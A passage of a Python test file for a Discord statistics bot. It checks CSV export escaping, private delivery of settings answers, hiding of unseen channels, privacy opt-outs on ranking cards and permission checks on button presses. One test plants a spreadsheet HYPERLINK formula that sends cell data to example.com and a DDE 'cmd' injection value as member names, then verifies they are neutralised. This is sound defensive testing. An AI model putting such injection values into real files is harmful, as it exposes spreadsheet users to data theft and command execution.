                self.assertEqual(interaction.response.calls[0][0], "defer")
                self.assertIsInstance(interaction.followup.sent[0][1]["file"], discord.File)


def said(interaction: FakeInteraction) -> str:
    """Everything an interaction answered, as text."""
    return " ".join(str(call) for call in interaction.response.calls) + " " + " ".join(str(sent) for sent in interaction.followup.sent)


class Files(StatsCase):
    """A file someone opens in a spreadsheet keeps every name as text."""

    def rows(self, ctx) -> list[list[str]]:
        file = ctx.sent[-1]["file"]
        file.fp.seek(0)
        return list(csv.reader(io.StringIO(file.fp.read().decode("utf-8"))))

    async def test_names_that_read_as_formulas_stay_text(self):
        evil = FakeMember(self.guild, "@evil", self.role_member)
        evil.nick = '=HYPERLINK("https://example.com/?d="&A1,"Open")'
        evil.global_name = "+cmd|' /C calc'!A0"
        ctx = self.context(author=self.admin)
        await self.stats.info_roles.callback(self.stats, ctx, self.role_member)
        rows = self.rows(ctx)
        found = next(row for row in rows if row[0] == str(evil.id))
        self.assertEqual(found[1:4], ["'@evil", "'+cmd|' /C calc'!A0", "'" + evil.nick])
        plain = next(row for row in rows if row[0] == str(self.member.id))
        self.assertEqual(plain[1:3], ["member", "member"], "an ordinary name stays as it is")

    async def test_sticker_names_that_read_as_formulas_stay_text(self):
        self.guild.emojis = []
        self.guild.stickers = [types.SimpleNamespace(id=333333333333333333 + number, name=name, animated=False, available=True, format="png")
                               for number, name in enumerate(("=1+1", "-2+3", "\tlead", "\rlead", "plain"))]
        ctx = self.context(author=self.admin)
        await self.stats.info_emoji.callback(self.stats, ctx)
        self.assertEqual(sorted(row[1] for row in self.rows(ctx)[1:]), sorted(["'=1+1", "'-2+3", "'\tlead", "'\rlead", "plain"]))

    async def test_the_roles_file_needs_manage_roles(self):
        roles = FakeMember(self.guild, "roles", self.guild.role("Role managers", 6, "manage_roles"))
        for command in (self.bot.get_command("statsinfo roles"), self.stats._info_slash().get_command("roles")):
            with self.subTest(command=command.qualified_name):
                self.assertFalse(self.bot.command_decision(command, self.member, self.channel).allowed)
                self.assertFalse(self.bot.command_decision(command, self.mod, self.channel).allowed, "Manage Messages isn't enough")
                self.assertTrue(self.bot.command_decision(command, roles, self.channel).allowed)


class PrivateAnswers(StatsCase):
    """Answers that name the server's settings, channels or people reach only the person who asked."""

    async def asyncSetUp(self):
        await super().asyncSetUp()
        self.manager = FakeMember(self.guild, "manager", self.guild.role("Managers", 6, "manage_guild"))
        await self.settings_save(channels=[self.secret.id, self.channel.id], channel_mode="allow", members=[self.mod.id])

    async def test_typed_answers_go_by_dm_with_a_pointer_where_they_were_asked(self):
        for name, args in (("settings_group", ()), ("settings_time", (None, "30", None, None)), ("filter_members_add", (self.member,)),
                           ("filter_channels_mode", ("block",)), ("check_report", ())):
            with self.subTest(command=name):
                ctx = self.context(author=self.manager)
                self.manager.dms.clear()
                await getattr(self.stats, name).callback(self.stats, ctx, *args)
                self.assertEqual(ctx.sent, [], "nothing that names the settings lands in the channel")
                self.assertEqual(ctx.fails, [])
                self.assertTrue(self.manager.dms, "the answer went by DM")
                self.assertEqual(ctx.oks, [words.t("en-US", "sent_by_dm")])

    async def test_closed_dms_and_muted_commands(self):
        ctx = self.context(author=self.manager)
        self.manager.send = mock.AsyncMock(side_effect=discord.Forbidden(types.SimpleNamespace(status=403, reason="closed"), "closed"))
        await self.stats.settings_group.callback(self.stats, ctx)
        self.assertEqual(ctx.sent, [])
        self.assertEqual(ctx.fails, [words.t("en-US", "dm_closed")])
        muted = self.context(author=self.admin)
        muted.decision = types.SimpleNamespace(muted=True, redirect=None, restricted_channel=None)
        await self.stats.settings_group.callback(self.stats, muted)
        self.assertEqual((muted.sent, muted.oks, self.admin.dms), ([], [], []), "the server's rules silence it, so nothing goes anywhere")

    async def test_a_slash_answer_is_only_for_the_asker(self):
        ctx = self.context(author=self.manager)
        ctx.interaction = types.SimpleNamespace(locale="en-US", response=types.SimpleNamespace(is_done=lambda: False))
        await self.stats.settings_group.callback(self.stats, ctx)
        self.assertTrue(ctx.sent[-1]["ephemeral"])
        self.assertIsNotNone(ctx.sent[-1]["embed"])
        self.assertEqual(self.manager.dms, [])

    async def test_channels_the_asker_cant_see_are_counted_not_named(self):
        ctx = self.context(author=self.manager)
        await self.stats.settings_group.callback(self.stats, ctx)
        text = "\n".join(field.value for field in self.manager.dms[-1]["embed"].fields)
        self.assertNotIn(str(self.secret.id), text)
        self.assertIn(f"<#{self.channel.id}>", text)
        self.assertIn(words.t("en-US", "hidden_from_you", amount=words.amount("en-US", 1, "channel")), text)
        await self.stats.settings_group.callback(self.stats, self.context(author=self.admin))
        self.assertIn(f"<#{self.secret.id}>", "\n".join(field.value for field in self.admin.dms[-1]["embed"].fields), "an Administrator sees every channel")

    async def test_the_check_file_names_only_channels_the_asker_can_see(self):
        self.guild.me.roles = [self.guild.default_role]  # the bot loses Administrator, so it can't see the staff room
        ctx = self.context(author=self.manager)
        ctx.interaction = types.SimpleNamespace(locale="en-US", response=types.SimpleNamespace(is_done=lambda: False))
        await self.stats.check_report.callback(self.stats, ctx)
        file = ctx.sent[-1]["file"]
        file.fp.seek(0)
        text = file.fp.read().decode("utf-8")
        self.assertNotIn("staff-room", text)
        self.assertNotIn(str(self.secret.id), text)
        self.assertIn(words.t("en-US", "hidden_from_you", amount=words.amount("en-US", 1, "channel")), text)
        admin = self.context(author=self.admin)
        admin.interaction = ctx.interaction
        await self.stats.check_report.callback(self.stats, admin)
        file = admin.sent[-1]["file"]
        file.fp.seek(0)
        self.assertIn("staff-room", file.fp.read().decode("utf-8"), "an Administrator can see it, so it's named for them")

    async def test_a_command_channel_refusal_names_only_channels_everyone_here_can_see(self):
        other = FakeChannel(self.guild, "bot-commands")
        await self.settings_save(command_channel_mode="allow", command_channels=[other.id, self.secret.id])
        ctx = self.context(author=self.member)
        await self.stats.me_card.callback(self.stats, ctx)
        self.assertEqual(ctx.fails, [words.t("en-US", "channel_only", channels=words.t("en-US", "and_more", items=f"<#{other.id}>", count="1"))])
        await self.settings_save(command_channels=[self.secret.id])
        ctx = self.context(author=self.member)
        await self.stats.me_card.callback(self.stats, ctx)
        self.assertEqual(ctx.fails, [words.t("en-US", "channel_blocked")], "no channel it may name, so it says only that this one is out")


class PrivacyOnCards(StatsCase):
    """Someone who chose privacy is never named or ranked on a card, from the moment they choose it, moved or not."""

    def scope(self, code="a") -> views.Scope:
        cfg = self.stats.cfg(self.guild.id)
        return views.Scope(db=self.bot.message_db, guild=self.guild, cfg=cfg, lang="en-US", now=NOW.timestamp(), lookback=views.lookback_of(code, cfg),
                           filters=views.filters_for(cfg, self.guild), visibility=views.Visibility(self.guild, self.admin, self.channel, True),
                           private=frozenset(self.stats.private))

    async def test_before_the_move_no_card_names_or_ranks_them(self):
        now = NOW.timestamp()
        await self.bot.message_db.run("INSERT INTO stat_invites (guild_id, code, inviter_id, uses) VALUES (?, 'mine', ?, 1)", (self.guild.id, self.member.id))
        await self.bot.message_db.run("INSERT INTO stat_joins (guild_id, user_id, at, code, inviter_id, account_created) VALUES (?, ?, ?, 'mine', ?, ?)",
                                      (self.guild.id, self.mod.id, now - 3600, self.member.id, now - 400 * 86400))
        before = self.scope()
        self.assertEqual([row["id"] for row in (await views.gather(before, "messages"))["top_members"]], [self.admin.id, self.member.id])
        self.assertEqual([row["id"] for row in (await views.gather(before, "invites"))["top_inviters"]], [self.member.id])
        with mock.patch.object(sc.store, "anonymize", mock.AsyncMock(side_effect=RuntimeError("disk"))):
            key, _ = await self.stats.set_privacy(self.member.id, True, now=now)
        self.assertEqual(key, "privacy_failed")
        self.assertGreater(await self.bot.message_db.scalar("SELECT COUNT(*) FROM stat_messages WHERE user_id = ?", (self.member.id,)), 0, "the move hasn't happened")
        scope = self.scope()
        everyone = await self.bot.message_db.scalar("SELECT SUM(count) FROM stat_messages WHERE guild_id = ?", (self.guild.id,))
        messages = await views.gather(scope, "messages")
        self.assertEqual([row["id"] for row in messages["top_members"]], [self.admin.id])
        self.assertEqual(messages["rows"][-1]["total"], everyone, "their messages still count toward the total")
        page = await views.gather(scope, "top", page_kind="members_messages")
        self.assertEqual([row["id"] for row in page["rows"]], [self.admin.id])
        overview = await views.gather(scope, "top")
        self.assertNotIn(self.member.id, [row["id"] for row in overview["sections"]["members_messages"]])
        server = await views.gather(scope, "server")
        self.assertEqual(server["top_member_messages"]["id"], self.admin.id)
        self.assertEqual(server["rows"][-1]["people"], 1)
        self.assertEqual((await views.gather(scope, "member", self.admin))["ranks"]["messages"], (1, 1), "they aren't among the ranked")
        self.assertEqual((await views.gather(scope, "channel", self.channel))["top_members"], [])
        invites = await views.gather(scope, "invites")
        self.assertEqual(invites["top_inviters"], [])
        self.assertNotIn("member", [entry.get("label") for entry in invites["top_invites"]])
        named = await views.people(scope, [self.member.id])
        self.assertIsNone(named[self.member.id]["name"])

    async def test_a_card_drawn_while_privacy_changes_isnt_kept(self):
        real = views.gather

        async def gather_then_choose(*args, **kwargs):
            data = await real(*args, **kwargs)
            await self.stats.set_privacy(self.member.id, True, now=NOW.timestamp())
            return data

        request = sc.Request("messages", 0, "s", "overview", 0, self.admin.id, self.guild.id)
        visibility = views.Visibility(self.guild, self.admin, self.channel, True)
        with mock.patch.object(views, "gather", side_effect=gather_then_choose):
            await self.stats.card_png(self.guild, request, None, "en-US", visibility, ("public", self.channel.id))
        with mock.patch.object(views, "gather", wraps=real) as again:
            _, data = await self.stats.card_png(self.guild, request, None, "en-US", visibility, ("public", self.channel.id))
        self.assertEqual(again.call_count, 1, "the card drawn before the choice wasn't kept")
        self.assertNotIn(self.member.id, [row["id"] for row in data["top_members"]])


class CategoryCards(StatsCase):
    async def test_a_category_card_adds_up_only_channels_its_readers_can_see(self):
        category = FakeChannel(self.guild, "Community", discord.ChannelType.category)
        chat = FakeChannel(self.guild, "chat", category=category)
        hidden = FakeChannel(self.guild, "mod-log", category=category)
        hidden.permissions_for = lambda member: FakePermissions("administrator") if member.guild_permissions.administrator else FakePermissions()
        hidden.overwrites = {self.guild.default_role: discord.PermissionOverwrite(view_channel=False)}
        slot = tf.slot_of(NOW.timestamp())
        await self.bot.message_db.many("INSERT INTO stat_messages (guild_id, slot, channel_id, user_id, flags, count) VALUES (?, ?, ?, ?, 0, ?)",
                                       [(self.guild.id, slot - 1, chat.id, self.member.id, 5), (self.guild.id, slot - 2, hidden.id, self.mod.id, 40)])
        ctx = self.context(author=self.member)
        with mock.patch.object(cards, "render", wraps=cards.render) as drawn:
            await self.stats.channel_card.callback(self.stats, ctx, category)
        self.assertFalse(ctx.sent[-1].get("ephemeral"), "posted for everyone in #general")
        data = drawn.call_args.args[0]
        self.assertEqual(data["blocks"]["messages"][0]["total"], 5)
        self.assertEqual([row["id"] for row in data["top_members"]], [self.member.id])
        slash = self.context(author=self.admin)
        slash.interaction = types.SimpleNamespace(locale="en-US", response=types.SimpleNamespace(is_done=lambda: False))
        await self.stats.private_replies_command(slash, "on")
        with mock.patch.object(cards, "render", wraps=cards.render) as drawn:
            await self.stats.channel_card.callback(self.stats, slash, category)
        self.assertEqual(drawn.call_args.args[0]["blocks"]["messages"][0]["total"], 45, "an answer only an Administrator sees counts both")


class ThreadsOnLists(StatsCase):
    async def test_a_thread_stands_for_its_channel_on_the_filter_and_the_command_channels(self):
        thread = FakeChannel(self.guild, "printer-help", discord.ChannelType.public_thread)
        thread.parent = self.channel
        thread.parent_id = self.channel.id
        ctx = self.context(author=self.admin)
        await self.stats.filter_channels_add.callback(self.stats, ctx, thread)
        self.assertEqual(self.stats.cfg(self.guild.id)["channels"], [self.channel.id])
        note = words.t("en-US", "thread_means_channel", channel=f"<#{self.channel.id}>")
        self.assertIn(note, self.admin.dms[-1]["content"])
        await self.stats.filter_channels_remove.callback(self.stats, ctx, thread)
        self.assertEqual(self.stats.cfg(self.guild.id)["channels"], [])
        await self.stats.settings_access.callback(self.stats, ctx, None, "allow", thread, None, None, None)
        self.assertEqual(self.stats.cfg(self.guild.id)["command_channels"], [self.channel.id])
        self.assertIn(note, self.admin.dms[-1]["content"])
        inside = self.context(author=self.member, channel=thread)
        await self.stats.me_card.callback(self.stats, inside)
        self.assertEqual(inside.fails, [], "a command in the thread is in its channel, which is on the list")


class Periods(StatsCase):
    async def test_a_custom_start_before_2015_or_ahead_is_refused(self):
        request = sc.Request("server", 0, "s", "overview", 0, self.member.id, self.guild.id)
        for typed in ("2014-12-31", "0202-11-08", "1999-01-01", "<t:1300000000:D>"):
            with self.subTest(typed=typed):
                pressed = FakeInteraction(self.bot, self.member, self.guild, self.channel)
                await self.stats.custom_period_submitted(pressed, request, typed, "en-US")
                self.assertEqual(pressed.edits, [])
                self.assertIn(words.t("en-US", "custom_too_early"), said(pressed))
        ahead = FakeInteraction(self.bot, self.member, self.guild, self.channel)
        await self.stats.custom_period_submitted(ahead, request, "2099-01-01", "en-US")
        self.assertIn(words.t("en-US", "custom_future"), said(ahead))
        first = FakeInteraction(self.bot, self.member, self.guild, self.channel)
        await self.stats.custom_period_submitted(first, request, "2015-01-01", "en-US")
        self.assertEqual(len(first.edits), 1)
        ctx = self.context(author=self.admin)
        await self.stats.settings_time.callback(self.stats, ctx, None, "2014-06-01", None, None)
        self.assertEqual(ctx.fails[-1], words.t("en-US", "custom_too_early"))
        self.assertNotEqual(self.stats.cfg(self.guild.id)["lookback"].get("since"), "2014-06-01")

    async def test_a_start_saved_elsewhere_before_2015_still_draws(self):
        cfg = self.stats.cfg(self.guild.id)
        scope = views.Scope(db=self.bot.message_db, guild=self.guild, cfg=cfg, lang="en-US", now=NOW.timestamp(),
                            lookback={"mode": "since", "days": 14, "since": "0202-11-08"}, filters=views.filters_for(cfg, self.guild),
                            visibility=views.Visibility(self.guild, self.admin, self.channel, True))
        for view in ("server", "chart_messages", "invites"):
            with self.subTest(view=view):
                data = await views.gather(scope, view)
                self.assertTrue(cards.render(data, "en-US", {}).startswith(b"\x89PNG"))


class Presses(StatsCase):
    """A press on a card's buttons or menus, or the form behind Custom, goes through the same rules as the command did."""

    def request(self, view="server", **changes):
        base = sc.Request(view=view, target=0, period="s", kind="overview", page=0, owner=self.member.id, guild=self.guild.id)
        return sc.Request(**{**base.__dict__, **changes})

    async def press(self, who, request, action="r", value=None):
        pressed = FakeInteraction(self.bot, who, self.guild, self.channel)
        await self.stats.card_pressed(pressed, request, action, value)
        return pressed

    async def test_access_levels_and_command_channels_hold_for_presses(self):
        await self.settings_save(command_access="restricted")
        pressed = await self.press(self.member, self.request("member", target=self.admin.id, owner=self.admin.id))
        self.assertIn(words.t("en-US", "access_restricted"), said(pressed))
        self.assertEqual((pressed.edits, pressed.followup.sent), ([], []))
        await self.settings_save(command_access="self")
        self.assertIn(words.t("en-US", "access_self"), said(await self.press(self.member, self.request(), "p", "a")))
        await self.settings_save(command_access="admins")
        self.assertIn(words.t("en-US", "access_admins"), said(await self.press(self.member, self.request("top"), "s", "members_messages")))
        other = FakeChannel(self.guild, "bot-commands")
        await self.settings_save(command_access="all", command_channel_mode="allow", command_channels=[other.id])
        pressed = await self.press(self.member, self.request())
        self.assertIn(words.t("en-US", "channel_only", channels=f"<#{other.id}>"), said(pressed))
        submitted = FakeInteraction(self.bot, self.member, self.guild, self.channel)
        await self.stats.custom_period_submitted(submitted, self.request(), "90", "en-US")
        self.assertIn(words.t("en-US", "channel_only", channels=f"<#{other.id}>"), said(submitted))
        self.assertEqual(submitted.edits, [])

    async def test_a_channel_card_press_checks_who_can_see_the_channel(self):
        pressed = await self.press(self.member, self.request("channel", target=self.secret.id, owner=self.admin.id))
        self.assertIn(words.t("en-US", "cant_see_channel"), said(pressed))
        self.assertEqual((pressed.edits, pressed.followup.sent), ([], []))
        own = await self.press(self.admin, self.request("channel", target=self.secret.id, owner=self.admin.id))
        self.assertEqual(own.edits, [], "not redrawn in place where not everyone can see the channel")
        self.assertTrue(own.followup.sent and own.followup.sent[0][1]["ephemeral"], "a copy only the asker sees")


if __name__ == "__main__":
    import unittest
    unittest.main()
